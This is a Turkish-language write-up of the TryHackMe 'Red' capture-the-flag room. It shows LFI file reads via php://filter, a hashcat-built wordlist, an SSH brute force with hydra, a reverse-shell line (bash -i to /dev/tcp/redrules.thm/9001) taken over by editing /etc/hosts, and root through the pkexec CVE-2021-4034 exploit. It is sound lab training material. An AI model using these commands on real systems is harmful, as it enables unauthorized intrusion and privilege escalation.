---
title: 'TryHackMe | Red WriteUp'
author: appdone
categories: [TryHackMe Challenges]
tags: [lfi]
render_with_liquid: false
media_subpath: /images/tryhackme_red/
image:
  path: logo.webp
---

## Özet
Web uygulamasında bulunan "Local File Inclusion" zafiyetinden yararlanarak "blue" kullanıcısının dizinideki gizli dosyayı keşfedeceğiz. Bu dosyadaki yönergeleri takip ederek bir parola listesi oluşturacak ve bu parola listesini kullanarak SSH servisine deneme yanılma saldırısı yapacağız. Sonucunda elde ettiğimiz parolayı kullanarak SSH servisine bağlanacak ve yetki yükseltmek için bir takım kontroller yapacağız. Arka planda çalışan bağlantıyı fark ettikten sonra domain'in IP adresini değiştirecek ve bağlantıyı kendi makinemize yönlendireceğiz. Sonrada zafiyetli pkexec uygulamasını fark edecek ve internette bulduğumuz bir sömürü aracını kullanarak yetki yükselteceğiz.

## Makine hakkında ek bilgiler

- Makineye bağlanan kullanıcıların bağlantıları sonlandırılıp, parolaları değiştiriliyor.
- Odağımızı bozacak mesajlar ile karşılaşabiliriz.

## Keşif aşaması

### Nmap Taraması

```console
$ nmap -sV -sC -T4 10.10.35.115
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:74:1c:e0:f7:86:4d:69:46:f6:5b:4d:be:c3:9f:76 (RSA)
|   256 fb:84:73:da:6c:fe:b9:19:5a:6c:65:4d:d1:72:3b:b0 (ECDSA)
|_  256 5e:37:75:fc:b3:64:e2:d8:d6:bc:9a:e6:7e:60:4d:3c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Atlanta - Free business bootstrap template
|_Requested resource was /index.php?page=home.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Bulgular

- Web uygulaması hazır web teması içeriyor.
- Tema sayfaları index.php dosyasına gönderilen "page" parametresi ile sayfaya dahil ediliyor.

### 80 numaralı port'un incelenmesi

![](1.webp){: width="1200" height="600" }

Kullanılan hazır tema düzenlenmemiş gibi duruyor. "page" parametresinin aldığı değeri /etc/passwd ve türevleri olacak şekilde değiştirdiğimde her seferinde home.html sayfasına yönlendiriyor. Sistemde bulunan dosyaları görüntüleyebilmek için parametreye "php://filter/convert.base64-encode/resource=/etc/passwd" şeklinde bir değer girdiğimde ise base64 ile kodlanmış olarak dosya içeriğini okuyabiliyorum.

## Sömürü Aşaması

```console
$ curl -s http://10.10.35.115/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd | base64 -d                                                                          
root:x:0:0:root:/root:/bin/bash
...
blue:x:1000:1000:blue:/home/blue:/bin/bash
red:x:1001:1001::/home/red:/bin/bash
```

Sistemde root haricinde "red" ve "blue" olmak üzere iki kullanıcı var. "blue" kullanıcısının dizinindeki .bash_history isimli dosyayı kontrol ettiğimizde, aynı dizindeki .reminder dosyasında bulunan bir metni kullanarak hashcat ile belli kurallar dahilinde bir parola listesi oluşturduğunu görüyoruz.

```console
$ curl -s http://10.10.35.115/index.php?page=php://filter/convert.base64-encode/resource=/home/blue/.bash_history | base64 -d
echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
```

".reminder" isimli dosyanın içeriği aşağıdaki şekildedir.

```console
$ curl -s http://10.10.35.115/index.php?page=php://filter/convert.base64-encode/resource=/home/blue/.reminder | base64 -d
sup3r_p@s$w0rd!
```

Red kullanıcısının blue kullanıcısı için oluşturduğu parola listesini aynı komutu kullanarak oluşturalım.

```console
$ nano .reminder
$ hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
```

Daha sonra elde ettiğimiz parola listesini kullanarak SSH servisine deneme yanılma saldırısı yapalım.

```console
$ hydra -l blue -P passlist.txt ssh://10.10.35.115
[DATA] attacking ssh://10.10.35.115:22/
[22][ssh] host: 10.10.35.115   login: blue   password: sup3r_p@s$w0sup3r_p@s$w0
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-20 04:28:00
```

Elimizdeki kullanıcı bilgilerini kullanarak SSH servisine bağlandıktan sonra bulunduğumuz dizinde ilk bayrağı görüyoruz.

```console
blue@red:~$ ls
flag1
blue@red:~$ cat flag1 
THM{***?}
```

Başta belirtiğim gibi ara ara bağlantı sonlandırılıyor ve parola değiştiriliyor. Aynı parola listesini kullanarak tekrar tekrar deneme yanılma saldırısı yapmanız gerekebilir.

## Yetki yükseltme

### Red

"ps aux" komutunu kullandığımızda arka planda red kullanıcısının redrules.thm adresinin 9001 portuna bağlandığını görüyoruz.

```console
blue@red:/var/backups$ ps aux
...
red         2557  0.0  0.0   6972  2496 ?        S    08:31   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
red         2582  0.0  0.0   6972  2692 ?        S    08:32   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
root        2593  0.0  0.0      0     0 ?        I    08:32   0:00 [kworker/u30:1-events_unbound]
red         2628  0.0  0.0   6972  2696 ?        S    08:33   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
```

/etc/hosts dosyasına domain ile beraber makinemizin IP adresini girdikten bir süre sonra red kullanıcısının adına bir bağlantı alıyoruz. Dosyayı temizlediği için bu işlemi bağlantı alana kadar bir kaç kez tekrar etmeniz gerekebilir.

![](2.webp){: width="1200" height="600" }

Bağlantı geldikten sonra kendi dizininden ikinci bayrağı alıyoruz.

```console
red@red:~$ cat flag2 
THM{***}
```

### Root

/home/red/.git/ dizini içerisinde "pkexec" adında bir dosya bulunuyor. Bu dosyaya SUID izni verilmiş ve zafiyetli bir sürümü kullanılıyor.

```console
red@red:~/.git$ ls -la
drwxr-x--- 2 red  red   4096 Aug 14  2022 .
drwxr-xr-x 4 root red   4096 Aug 17  2022 ..
-rwsr-xr-x 1 root root 31032 Aug 14  2022 pkexec
red@red:~/.git$ ./pkexec --version
pkexec version 0.105
```

Adını ve sürümünü internette arattıktan sonra [bu](https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py) sayfa ile karşılaştım. Verilen python kodlarını düzenleyip kayıt ettikten sonra çalıştırdım ve başarıyla root haklarına sahip oldum.

```console
red@red:~/.git$ ls
CVE-2021-4034.py  pkexec
red@red:~/.git$ python3 CVE-2021-4034.py 
[+] Creating shared library for exploit code.
[+] Calling execve()
# id
uid=0(root) gid=1001(red) groups=1001(red)
# cd /root
# ls
defense  flag3  snap
# cat flag3
THM{***}
```
